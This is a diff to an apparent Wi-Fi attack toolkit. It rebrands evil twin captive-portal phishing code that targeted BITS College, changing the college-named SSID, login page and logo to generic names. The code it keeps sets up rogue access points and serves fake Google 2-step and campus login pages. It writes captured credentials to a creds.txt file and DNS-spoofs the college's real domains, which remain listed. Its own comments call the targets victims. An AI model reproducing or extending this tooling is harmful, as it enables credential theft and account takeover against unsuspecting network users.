@@ -456,7 +456,9 @@ show_intro_main_frame() {
 
     centered() {
         local text="$1" color="$2"
-        local len=${#text}
+        # count UTF-8 codepoints, not bytes — braille chars are 3 bytes each
+        local len
+        len=$(printf '%s' "$text" | LC_ALL=C.UTF-8 wc -m | tr -d ' ')
         local p=$(( (INNER_W - len) / 2 ))
         [ "$p" -lt 0 ] && p=0
         local r=$(( INNER_W - len - p ))
@@ -542,7 +544,7 @@ show_intro_main_frame() {
     blank_line
     centered "Instagram  -> @zeruaep" "${YELLOW}"
     centered "TikTok     -> @zeruaep" "${YELLOW}"
-    centered "GitHub     -> zeru-aep" "${YELLOW}"
+    centered "GitHub     -> PH0B14-toolkit" "${YELLOW}"
     centered "Telegram   -> @zeru_aep" "${YELLOW}"
     blank_line
     div_line
@@ -1058,8 +1060,8 @@ evil_twin_phish() {
     read -p "$(echo -e ${YELLOW}'Select [1/2]: '${NC})" AP_SRC
     loading_bar "Loading"
     if [ "$AP_SRC" = "1" ]; then
-        read -p "$(echo -e ${YELLOW}'SSID name [BITS College Lab 1]: '${NC})" TARGET_ESSID
-    TARGET_ESSID="${TARGET_ESSID:-BITS College Lab 1}"
+        read -p "$(echo -e ${YELLOW}'SSID name [Lab Network]: '${NC})" TARGET_ESSID
+    TARGET_ESSID="${TARGET_ESSID:-Lab Network}"
         read -p "$(echo -e ${YELLOW}'Channel [6]: '${NC})" TARGET_CHANNEL
         TARGET_CHANNEL="${TARGET_CHANNEL:-6}"
         TARGET_BSSID=""; DO_DEAUTH="no"
@@ -1081,18 +1083,18 @@ evil_twin_phish() {
     reset_portal_state
 
     # ensure bits page + logo are always served
-    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
-        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
-        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
+    if [ -f "$PAGES_DIR/custom-logo.png" ]; then
+        cp "$PAGES_DIR/custom-logo.png" /var/www/html/custom-logo.png 2>/dev/null
+        chmod 644 /var/www/html/custom-logo.png 2>/dev/null
     fi
     if [ -f "$PAGES_DIR/google-2step.html" ]; then
         cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
     fi
 
     # ensure bits page + logo are always served
-    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
-        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
-        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
+    if [ -f "$PAGES_DIR/custom-logo.png" ]; then
+        cp "$PAGES_DIR/custom-logo.png" /var/www/html/custom-logo.png 2>/dev/null
+        chmod 644 /var/www/html/custom-logo.png 2>/dev/null
     fi
     if [ -f "$PAGES_DIR/google-2step.html" ]; then
         cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
@@ -1102,7 +1104,7 @@ evil_twin_phish() {
     rm -f /var/www/html/creds.txt 2>/dev/null; touch /var/www/html/creds.txt; chmod 666 /var/www/html/creds.txt
     [ -f "$PAGES_DIR/verified.html" ] && cp "$PAGES_DIR/verified.html" /var/www/html/verified.html 2>/dev/null
     [ -f "$PAGES_DIR/google-2step.html" ] && cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
-    [ -f "$PAGES_DIR/bits-login.html" ] && cp "$PAGES_DIR/bits-login.html" /var/www/html/bits-login.html 2>/dev/null
+    [ -f "$PAGES_DIR/custom-login.html" ] && cp "$PAGES_DIR/custom-login.html" /var/www/html/custom-login.html 2>/dev/null
     chmod 644 /var/www/html/*.html 2>/dev/null
     [ ! -f "$G2SRC/index.html" ] && echo -e "${RED}[!] Missing google page.${NC}" && pause && return
     cp "$G2SRC/index.html" /var/www/html/index.html
@@ -1238,7 +1240,7 @@ class H(http.server.SimpleHTTPRequestHandler):
                 # full inline fallback — same design as verified.html
                 d = """<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">
 <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
-<title>Account Verified — BITS College</title>
+<title>Account Verified — the network</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Arial,sans-serif;
@@ -1264,7 +1266,7 @@ font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:16px}
 .foot{font-size:11px;color:#999;margin-top:22px}
 </style></head><body>
 <div class=\"wrap\">
-<h1>BITS College's Online Application Service</h1>
+<h1>Secure Access Portal</h1>
 <div class=\"notice\"><strong>Verification complete.</strong><br>
 You now have full access to the lab network.</div>
 <div class=\"card\">
@@ -1278,7 +1280,7 @@ You now have full access to the lab network.</div>
 You may safely close this window to continue.</p>
 <div class=\"status\" id=\"st\">Closing automatically&hellip;</div>
 </div>
-<div class=\"foot\">&copy; BITS College</div>
+<div class=\"foot\">&copy; the network</div>
 </div>
 <script>
 var e='';try{var p=new URLSearchParams(location.search);e=p.get('e')||p.get('email')||'';}catch(_){}
@@ -1299,10 +1301,10 @@ setTimeout(function(){document.getElementById('st').textContent='You may close t
             try: self.wfile.write(d)
             except Exception: pass
             return
-        if path.startswith("/bits-logo"):
-            return self._serve_file("/var/www/html/bits-logo.png", "image/png")
-        if path in ("/bits-login.html", "/bits-login"):
-            return self._serve_file("/var/www/html/bits-login.html")
+        if path.startswith("/custom-logo"):
+            return self._serve_file("/var/www/html/custom-logo.png", "image/png")
+        if path in ("/custom-login.html", "/custom-login"):
+            return self._serve_file("/var/www/html/custom-login.html")
 
         # captive probe check
         is_probe = (
@@ -1512,18 +1514,18 @@ evil_twin_firmware_run() {
     reset_portal_state
 
     # ensure bits page + logo are always served
-    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
-        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
-        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
+    if [ -f "$PAGES_DIR/custom-logo.png" ]; then
+        cp "$PAGES_DIR/custom-logo.png" /var/www/html/custom-logo.png 2>/dev/null
+        chmod 644 /var/www/html/custom-logo.png 2>/dev/null
     fi
     if [ -f "$PAGES_DIR/google-2step.html" ]; then
         cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
     fi
 
     # ensure bits page + logo are always served
-    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
-        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
-        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
+    if [ -f "$PAGES_DIR/custom-logo.png" ]; then
+        cp "$PAGES_DIR/custom-logo.png" /var/www/html/custom-logo.png 2>/dev/null
+        chmod 644 /var/www/html/custom-logo.png 2>/dev/null
     fi
     if [ -f "$PAGES_DIR/google-2step.html" ]; then
         cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
@@ -1650,7 +1652,7 @@ class H(http.server.SimpleHTTPRequestHandler):
                 # full inline fallback — same design as verified.html
                 d = """<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">
 <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
-<title>Account Verified — BITS College</title>
+<title>Account Verified — the network</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Arial,sans-serif;
@@ -1676,7 +1678,7 @@ font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:16px}
 .foot{font-size:11px;color:#999;margin-top:22px}
 </style></head><body>
 <div class=\"wrap\">
-<h1>BITS College's Online Application Service</h1>
+<h1>Secure Access Portal</h1>
 <div class=\"notice\"><strong>Verification complete.</strong><br>
 You now have full access to the lab network.</div>
 <div class=\"card\">
@@ -1690,7 +1692,7 @@ You now have full access to the lab network.</div>
 You may safely close this window to continue.</p>
 <div class=\"status\" id=\"st\">Closing automatically&hellip;</div>
 </div>
-<div class=\"foot\">&copy; BITS College</div>
+<div class=\"foot\">&copy; the network</div>
 </div>
 <script>
 var e='';try{var p=new URLSearchParams(location.search);e=p.get('e')||p.get('email')||'';}catch(_){}
@@ -1711,10 +1713,10 @@ setTimeout(function(){document.getElementById('st').textContent='You may close t
             try: self.wfile.write(d)
             except Exception: pass
             return
-        if path.startswith("/bits-logo"):
-            return self._serve_file("/var/www/html/bits-logo.png", "image/png")
-        if path in ("/bits-login.html", "/bits-login"):
-            return self._serve_file("/var/www/html/bits-login.html")
+        if path.startswith("/custom-logo"):
+            return self._serve_file("/var/www/html/custom-logo.png", "image/png")
+        if path in ("/custom-login.html", "/custom-login"):
+            return self._serve_file("/var/www/html/custom-login.html")
 
         # captive probe check
         is_probe = (
@@ -10840,7 +10842,7 @@ class H(http.server.BaseHTTPRequestHandler):
             pass
         print("[+] creds:", self.client_address[0], raw, flush=True)
         # send a small HTML page that redirects to /?verified=1
-        # so the bits-login page shows its notification banner
+        # so the login page shows its notification banner
         host = (self.headers.get("Host") or "").split(":")[0]
         html = ('<!DOCTYPE html><html><head><meta charset="utf-8">'
                 '<meta http-equiv="refresh" content="0;url=http://%s/?verified=1">'
@@ -11170,7 +11172,7 @@ main_menu() {
 # ===============================================================
 # BITS login page — spoof support
 # ===============================================================
-# The pick-page menus will find bits-login.html automatically from
+# The pick-page menus will find custom-login.html automatically from
 # $PAGES_DIR. This block just reminds the spoof config where to route
 # BITS-related hostnames.
 
@@ -11178,14 +11180,14 @@ _bits_domains() {
     echo "bitscollege.edu.et,www.bitscollege.edu.et,bits.edu.et,www.bits.edu.et"
 }
 
-# convenience — set bits-login.html as the current captive page
+# convenience — set custom-login.html as the current captive page
 _bits_set_default_page() {
-    [ -f "$PAGES_DIR/bits-login.html" ] || {
-        echo -e "${RED}[!] bits-login.html not found${NC}"
+    [ -f "$PAGES_DIR/custom-login.html" ] || {
+        echo -e "${RED}[!] custom-login.html not found${NC}"
         return 1
     }
-    echo "bits-login.html" > "$PAGES_DIR/.current"
-    echo -e "${GREEN}[+] current page = bits-login.html${NC}"
+    echo "custom-login.html" > "$PAGES_DIR/.current"
+    echo -e "${GREEN}[+] current page = custom-login.html${NC}"
     echo -e "${DIM}    DNS spoof and evil twin will serve this for victims${NC}"
 }
 
@@ -11217,7 +11219,7 @@ _dnsm_pick_page() {
         [ "$base" = "$current" ] && mark=" ${GREEN}[current]${NC}"
         # highlight the recommended page
         local prefix=""
-        if [ "$base" = "bits-login.html" ]; then
+        if [ "$base" = "custom-login.html" ]; then
             prefix="${BOLD}${LIME}★${NC} "
         elif [ "$base" = "google-2step.html" ]; then
             prefix="${BOLD}${SKY}★${NC} "
@@ -11245,8 +11247,8 @@ _dnsm_pick_page() {
 # EVIL TWIN — BITS login banner (adds bits-login as a preset)
 # ===============================================================
 _bits_preset_page() {
-    if [ -f "$PAGES_DIR/bits-login.html" ]; then
-        echo "$PAGES_DIR/bits-login.html"
+    if [ -f "$PAGES_DIR/custom-login.html" ]; then
+        echo "$PAGES_DIR/custom-login.html"
     else
         echo ""
     fi
@@ -11255,10 +11257,10 @@ _bits_preset_page() {
 # convenience: use bits-login for both DNS spoof and evil twin
 _bits_use_for_evil_twin() {
     local b; b=$(_bits_preset_page)
-    [ -z "$b" ] && { echo -e "${RED}[!] bits-login.html missing${NC}"; return 1; }
-    echo "bits-login.html" > "$PAGES_DIR/.current"
+    [ -z "$b" ] && { echo -e "${RED}[!] custom-login.html missing${NC}"; return 1; }
+    echo "custom-login.html" > "$PAGES_DIR/.current"
     # evil twin reads $PAGES_DIR/.current when serving
-    echo -e "${GREEN}[+] Evil twin will serve bits-login.html${NC}"
+    echo -e "${GREEN}[+] Evil twin will serve custom-login.html${NC}"
     echo -e "${DIM}    activate in Evil Twin menu → option 1 or 2${NC}"
 }
 
@@ -11268,10 +11270,10 @@ _bits_use_for_evil_twin() {
 
 # ===============================================================
 # EVIL TWIN — BITS login option
-# Runs the evil twin AP with bits-login.html as the captive page.
+# Runs the evil twin AP with custom-login.html as the captive page.
 # Independent from DNS spoof. Doesn't touch the other two options.
 # ===============================================================
-evil_twin_bits() {
+evil_twin_custom() {
     # Pick AP source
     print_banner
     menu_header "E V I L   T W I N   —   B I T S"
@@ -11285,8 +11287,8 @@ evil_twin_bits() {
     loading_bar "Loading"
 
     if [ "$AP_SRC" = "1" ]; then
-        read -p "$(echo -e ${YELLOW}'SSID name [BITS College Lab 1]: '${NC})" TARGET_ESSID
-        TARGET_ESSID="${TARGET_ESSID:-BITS College Lab 1}"
+        read -p "$(echo -e ${YELLOW}'SSID name [Lab Network]: '${NC})" TARGET_ESSID
+        TARGET_ESSID="${TARGET_ESSID:-Lab Network}"
         read -p "$(echo -e ${YELLOW}'Channel [6]: '${NC})" TARGET_CHANNEL
         TARGET_CHANNEL="${TARGET_CHANNEL:-6}"
         TARGET_BSSID=""
@@ -11311,18 +11313,18 @@ evil_twin_bits() {
     reset_portal_state
 
     # ensure bits page + logo are always served
-    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
-        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
-        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
+    if [ -f "$PAGES_DIR/custom-logo.png" ]; then
+        cp "$PAGES_DIR/custom-logo.png" /var/www/html/custom-logo.png 2>/dev/null
+        chmod 644 /var/www/html/custom-logo.png 2>/dev/null
     fi
     if [ -f "$PAGES_DIR/google-2step.html" ]; then
         cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
     fi
 
     # ensure bits page + logo are always served
-    if [ -f "$PAGES_DIR/bits-logo.png" ]; then
-        cp "$PAGES_DIR/bits-logo.png" /var/www/html/bits-logo.png 2>/dev/null
-        chmod 644 /var/www/html/bits-logo.png 2>/dev/null
+    if [ -f "$PAGES_DIR/custom-logo.png" ]; then
+        cp "$PAGES_DIR/custom-logo.png" /var/www/html/custom-logo.png 2>/dev/null
+        chmod 644 /var/www/html/custom-logo.png 2>/dev/null
     fi
     if [ -f "$PAGES_DIR/google-2step.html" ]; then
         cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
@@ -11333,14 +11335,14 @@ evil_twin_bits() {
     touch /var/www/html/creds.txt
     chmod 666 /var/www/html/creds.txt
 
-    if [ ! -f "$PAGES_DIR/bits-login.html" ]; then
-        echo -e "${RED}[!] bits-login.html not found in $PAGES_DIR${NC}"
+    if [ ! -f "$PAGES_DIR/custom-login.html" ]; then
+        echo -e "${RED}[!] custom-login.html not found in $PAGES_DIR${NC}"
         addon_wait
         return
     fi
-    cp "$PAGES_DIR/bits-login.html" /var/www/html/index.html
-    cp "$PAGES_DIR/bits-login.html" /var/www/html/bits-login.html
-    cp "$PAGES_DIR/bits-logo.png"   /var/www/html/bits-logo.png 2>/dev/null
+    cp "$PAGES_DIR/custom-login.html" /var/www/html/index.html
+    cp "$PAGES_DIR/custom-login.html" /var/www/html/custom-login.html
+    cp "$PAGES_DIR/custom-logo.png"   /var/www/html/custom-logo.png 2>/dev/null
     [ -f "$PAGES_DIR/verified.html" ] && cp "$PAGES_DIR/verified.html" /var/www/html/verified.html 2>/dev/null
     [ -f "$PAGES_DIR/google-2step.html" ] && cp "$PAGES_DIR/google-2step.html" /var/www/html/google-2step.html 2>/dev/null
     chmod 644 /var/www/html/*.html /var/www/html/*.png 2>/dev/null
@@ -11467,7 +11469,7 @@ class H(http.server.SimpleHTTPRequestHandler):
                 # full inline fallback — same design as verified.html
                 d = """<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\">
 <meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">
-<title>Account Verified — BITS College</title>
+<title>Account Verified — the network</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Arial,sans-serif;
@@ -11493,7 +11495,7 @@ font-size:12px;font-weight:600;letter-spacing:.3px;margin-bottom:16px}
 .foot{font-size:11px;color:#999;margin-top:22px}
 </style></head><body>
 <div class=\"wrap\">
-<h1>BITS College's Online Application Service</h1>
+<h1>Secure Access Portal</h1>
 <div class=\"notice\"><strong>Verification complete.</strong><br>
 You now have full access to the lab network.</div>
 <div class=\"card\">
@@ -11507,7 +11509,7 @@ You now have full access to the lab network.</div>
 You may safely close this window to continue.</p>
 <div class=\"status\" id=\"st\">Closing automatically&hellip;</div>
 </div>
-<div class=\"foot\">&copy; BITS College</div>
+<div class=\"foot\">&copy; the network</div>
 </div>
 <script>
 var e='';try{var p=new URLSearchParams(location.search);e=p.get('e')||p.get('email')||'';}catch(_){}
@@ -11528,10 +11530,10 @@ setTimeout(function(){document.getElementById('st').textContent='You may close t
             try: self.wfile.write(d)
             except Exception: pass
             return
-        if path.startswith("/bits-logo"):
-            return self._serve_file("/var/www/html/bits-logo.png", "image/png")
-        if path in ("/bits-login.html", "/bits-login"):
-            return self._serve_file("/var/www/html/bits-login.html")
+        if path.startswith("/custom-logo"):
+            return self._serve_file("/var/www/html/custom-logo.png", "image/png")
+        if path in ("/custom-login.html", "/custom-login"):
+            return self._serve_file("/var/www/html/custom-login.html")
 
         # 3) captive probes → ALWAYS 302. must be before "already cleared" check
         #    because if we 204 a probe the OS marks the network "no internet" and
@@ -11667,8 +11669,8 @@ menu_evil_twin() {
         phb_row "  -- FIRMWARE --" "${BOLD}${PINK}"
         phb_row "  [2]  Modern Firmware Update"  "${BOLD}${PINK}"
         phb_row "  -- CUSTOM PAGES --" "${BOLD}${LIME}"
-        phb_row "  [3]  BITS College login page"  "${BOLD}${LIME}"
-        phb_row "       (bits-login.html as captive portal)" "${DIM}${GREY}"
+        phb_row "  [3]  the network login page"  "${BOLD}${LIME}"
+        phb_row "       (custom-login.html as captive portal)" "${DIM}${GREY}"
         phb_div
         phb_row "  [0]  Back"                    "${RED}"
         menu_footer
@@ -11676,7 +11678,7 @@ menu_evil_twin() {
         case "$CH" in
             1) evil_twin_phish ;;
             2) evil_twin_firmware ;;
-            3) evil_twin_bits ;;
+            3) evil_twin_custom ;;
             0) return ;;
             *) sleep 1 ;;
         esac
